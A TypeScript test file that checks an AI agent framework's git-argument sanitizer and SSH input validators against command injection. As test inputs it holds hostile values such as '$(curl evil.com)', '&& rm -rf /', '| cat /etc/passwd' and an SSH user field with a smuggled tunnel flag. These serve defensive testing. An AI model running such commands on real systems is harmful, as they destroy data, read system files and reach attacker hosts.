// SPDX-License-Identifier: Apache-2.0
/**
 * Command Injection Tests
 *
 * Validates that the git args sanitizer and SSH input validators
 * properly block shell injection attempts.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdir, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { executeTool, type ToolContext } from "../../src/agent/tools.js";
import { PolicyEngine } from "../../src/security/policy-engine.js";
import { AuditTrail } from "../../src/security/audit-trail.js";

describe("Command Injection Prevention", () => {
  let ctx: ToolContext;
  let testDir: string;

  beforeEach(async () => {
    testDir = join(tmpdir(), `tamalebot-injection-test-${Date.now()}`);
    await mkdir(testDir, { recursive: true });
    const logDir = join(testDir, "logs");
    ctx = {
      policy: new PolicyEngine(),
      audit: new AuditTrail(logDir, "test-agent"),
      agentId: "test-agent",
      workDir: testDir,
    };
  });

  afterEach(async () => {
    ctx.audit.close();
    await rm(testDir, { recursive: true, force: true });
  });

  describe("Git args sanitization", () => {
    it("should allow safe git args", async () => {
      const result = await executeTool("git", {
        action: "log",
        path: testDir,
        args: "--oneline -10",
      }, ctx);
      // May fail because not a git repo, but shouldn't be BLOCKED
      expect(result.output).not.toContain("BLOCKED");
    });

    it("should block semicolon injection in git args", async () => {
      const result = await executeTool("git", {
        action: "status",
        path: testDir,
        args: "; echo PWNED",
      }, ctx);
      expect(result.isError).toBe(true);
      expect(result.output).toContain("BLOCKED");
      expect(result.output).toContain("Unsafe character");
    });

    it("should block pipe injection in git args", async () => {
      const result = await executeTool("git", {
        action: "status",
        path: testDir,
        args: "| cat /etc/passwd",
      }, ctx);
      expect(result.isError).toBe(true);
      expect(result.output).toContain("BLOCKED");
    });

    it("should block backtick injection in git args", async () => {
      const result = await executeTool("git", {
        action: "diff",
        path: testDir,
        args: "`whoami`",
      }, ctx);
      expect(result.isError).toBe(true);
      expect(result.output).toContain("BLOCKED");
    });

    it("should block dollar-paren injection in git args", async () => {
      const result = await executeTool("git", {
        action: "log",
        path: testDir,
        args: "$(curl evil.com)",
      }, ctx);
      expect(result.isError).toBe(true);
      expect(result.output).toContain("BLOCKED");
    });

    it("should block ampersand injection in git args", async () => {
      const result = await executeTool("git", {
        action: "status",
        path: testDir,
        args: "&& rm -rf /",
      }, ctx);
      expect(result.isError).toBe(true);
      expect(result.output).toContain("BLOCKED");
    });

    it("should allow flags with equals and slashes", async () => {
      const result = await executeTool("git", {
        action: "log",
        path: testDir,
        args: "--format=%H --since=2024-01-01",
      }, ctx);
      // Should not be blocked by sanitizer (may fail for other reasons)
      expect(result.output).not.toContain("Unsafe character");
    });
  });

  describe("SSH input validation", () => {
    it("should block SSH host with shell metacharacters", async () => {
      const result = await executeTool("ssh_exec", {
        host: "evil.com; rm -rf /",
        command: "ls",
      }, ctx);
      expect(result.isError).toBe(true);
      expect(result.output).toContain("Invalid host");
    });

    it("should block SSH user with injection", async () => {
      const result = await executeTool("ssh_exec", {
        host: "example.com",
        user: "root -R 8080:localhost:80",
        command: "ls",
      }, ctx);
      expect(result.isError).toBe(true);
      expect(result.output).toContain("Invalid user");
    });

    it("should block SSH host with backticks", async () => {
      const result = await executeTool("ssh_exec", {
        host: "`whoami`.evil.com",
        command: "ls",
      }, ctx);
      expect(result.isError).toBe(true);
      expect(result.output).toContain("Invalid host");
    });

    it("should allow valid SSH host", async () => {
      const result = await executeTool("ssh_exec", {
        host: "server.example.com",
        user: "deploy",
        command: "ls",
      }, ctx);
      // Should not fail on validation (will fail because no vault)
      expect(result.output).not.toContain("Invalid host");
      expect(result.output).not.toContain("Invalid user");
    });

    it("should block invalid port", async () => {
      const result = await executeTool("ssh_exec", {
        host: "example.com",
        port: 99999,
        command: "ls",
      }, ctx);
      expect(result.isError).toBe(true);
      expect(result.output).toContain("Invalid port");
    });
  });
});
